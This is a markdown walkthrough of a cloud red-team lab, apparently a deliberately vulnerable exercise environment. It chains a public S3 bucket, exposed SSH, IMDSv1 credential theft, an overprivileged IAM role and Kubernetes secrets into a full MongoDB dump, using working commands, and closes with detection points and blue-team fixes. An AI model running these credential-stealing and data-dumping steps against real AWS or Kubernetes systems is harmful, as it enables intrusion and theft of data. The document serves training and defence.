# Full Attack Chain Demo

This demo walks through a complete attack chain, exploiting multiple vulnerabilities to achieve full infrastructure compromise.

## Attack Overview

```mermaid
flowchart TB
    subgraph Phase1["Phase 1: Reconnaissance"]
        A1[Discover S3 Bucket] --> A2[Port Scan MongoDB]
    end

    subgraph Phase2["Phase 2: Initial Access"]
        A2 --> B1[Download S3 Backups]
        A2 --> B2[SSH to MongoDB]
    end

    subgraph Phase3["Phase 3: Privilege Escalation"]
        B2 --> C1[Query IMDS]
        C1 --> C2[Steal AWS Credentials]
    end

    subgraph Phase4["Phase 4: Lateral Movement"]
        C2 --> D1[Enumerate AWS Resources]
        D1 --> D2[Access EKS Cluster]
    end

    subgraph Phase5["Phase 5: Data Exfiltration"]
        D2 --> E1[Dump K8s Secrets]
        E1 --> E2[Access MongoDB]
        E2 --> E3[Full Database Dump]
    end
```

## Prerequisites

```bash
# Deploy infrastructure
make build

# Get SSH keys
make ssh-keys

# Verify deployment
make show
```

## Phase 1: Reconnaissance

### Step 1.1: Discover Public S3 Bucket

From your local machine or Red Team instance:

```bash
# List bucket contents (no authentication required)
aws s3 ls s3://wiz-exercise-backups-xxxxx --no-sign-request
```

**Output:**
```
2024-01-15 02:00:00     15728640 backups/mongodb-backup-20240115.tar.gz
```

**Finding:** S3 bucket is publicly accessible!

### Step 1.2: Network Reconnaissance

```bash
# Get MongoDB IP from terraform output
MONGODB_IP=$(cd terraform && terraform output -raw mongodb_public_ip)

# Scan for open ports
nmap -Pn -p 22,27017,80,443 $MONGODB_IP
```

**Output:**
```
PORT      STATE    SERVICE
22/tcp    open     ssh
27017/tcp filtered mongodb
```

**Finding:** SSH is exposed to internet!

## Phase 2: Initial Access

### Step 2.1: Exfiltrate S3 Data

```bash
# Download backups
mkdir -p /tmp/loot
aws s3 sync s3://wiz-exercise-backups-xxxxx/backups/ /tmp/loot/ --no-sign-request

# Extract backup
cd /tmp/loot
tar -xzf mongodb-backup-*.tar.gz

# Examine contents
ls -la mongodb-backup-*/
```

**Finding:** Database backups contain sensitive data!

### Step 2.2: SSH to MongoDB

```bash
# Using obtained/leaked SSH key
ssh -i keys/mongodb.pem ubuntu@$MONGODB_IP
```

**Finding:** Direct SSH access achieved!

## Phase 3: Privilege Escalation

### Step 3.1: Query Instance Metadata

From MongoDB instance:

```bash
# Discover IAM role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Output:**
```
mongodb-role
```

### Step 3.2: Steal AWS Credentials

```bash
# Get temporary credentials
CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/mongodb-role)

# Parse credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)

# Verify access
aws sts get-caller-identity
```

**Output:**
```json
{
    "UserId": "AROAXXXXXXXXX:i-0abc123",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/mongodb-role/i-0abc123"
}
```

**Finding:** AWS credentials stolen via IMDS!

## Phase 4: Lateral Movement

### Step 4.1: Enumerate AWS Resources

```bash
# List all S3 buckets (not just public)
aws s3 ls

# Enumerate EC2 instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' --output table

# List IAM users
aws iam list-users

# List secrets
aws secretsmanager list-secrets
```

**Finding:** Instance role is massively overprivileged!

### Step 4.2: Access EKS Cluster

```bash
# Update kubeconfig using stolen credentials
aws eks update-kubeconfig --name wiz-exercise-eks --region us-east-1

# Verify access
kubectl cluster-info
kubectl get nodes
```

**Finding:** EKS cluster accessible with instance credentials!

## Phase 5: Data Exfiltration

### Step 5.1: Extract Kubernetes Secrets

```bash
# List all secrets across namespaces
kubectl get secrets --all-namespaces

# Get tasky namespace secrets
kubectl get secret mongodb-credentials -n tasky -o yaml

# Decode MongoDB URI
kubectl get secret mongodb-credentials -n tasky -o jsonpath='{.data.MONGODB_URI}' | base64 -d
```

**Output:**
```
mongodb://tasky:SecureAppPassword@10.0.1.50:27017/tasky
```

**Finding:** Database credentials extracted from K8s!

### Step 5.2: Access MongoDB

```bash
# Connect to MongoDB with stolen credentials
mongosh "mongodb://tasky:SecureAppPassword@10.0.1.50:27017/tasky"

# Enumerate database
show collections
db.todos.find()

# Dump entire database
mongodump --uri="mongodb://tasky:SecureAppPassword@10.0.1.50:27017/tasky" --out=/tmp/dump
```

**Finding:** Full database access achieved!

## Attack Summary

### Vulnerabilities Exploited

| Phase | Vulnerability | ID |
|-------|--------------|-----|
| 1 | Public S3 Bucket | WIZ-001 |
| 2 | Exposed SSH | WIZ-003 |
| 3 | IMDSv1 Enabled | WIZ-007 |
| 4 | Overprivileged IAM | WIZ-002 |
| 5 | cluster-admin SA | WIZ-004 |
| 5 | Plaintext Secrets | WIZ-005 |

### Data Compromised

- Database backups from S3
- AWS temporary credentials
- MongoDB database contents
- Kubernetes secrets
- JWT signing key

### Potential Further Actions

With this access, an attacker could:

1. **Persistence**: Create IAM users, deploy backdoors
2. **Cryptomining**: Deploy miners in EKS
3. **Ransomware**: Encrypt databases, demand payment
4. **Data Sale**: Sell stolen data on dark web
5. **Supply Chain**: Modify application code

## Detection Points

Throughout this attack, the following alerts should trigger:

| Phase | Detection | Service |
|-------|-----------|---------|
| 1 | Public bucket access | Security Hub |
| 2 | SSH from unusual IP | GuardDuty, Wazuh |
| 3 | IMDS access pattern | VPC Flow Logs |
| 4 | Credential use from unexpected IP | GuardDuty |
| 5 | Cross-namespace secret access | K8s Audit Logs |

## Cleanup

```bash
# Remove artifacts
rm -rf /tmp/loot /tmp/dump

# Unset credentials
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Exit SSH session
exit
```

## Lessons Learned

### Red Team Perspective

1. Public S3 buckets are low-hanging fruit
2. IMDS credentials enable lateral movement
3. Overprivileged IAM roles are common
4. K8s RBAC misconfigurations are prevalent

### Blue Team Perspective

1. Enable S3 Block Public Access account-wide
2. Require IMDSv2 for all instances
3. Apply least privilege to all IAM roles
4. Restrict K8s RBAC to minimum required
5. Use secrets management (not K8s secrets)

## Related Demos

- [S3 Exfiltration Details](s3-exfil.md)
- [K8s Exploitation Details](k8s-exploit.md)
- [Privilege Escalation Details](privesc.md)
- [Detection & Response](detection.md)
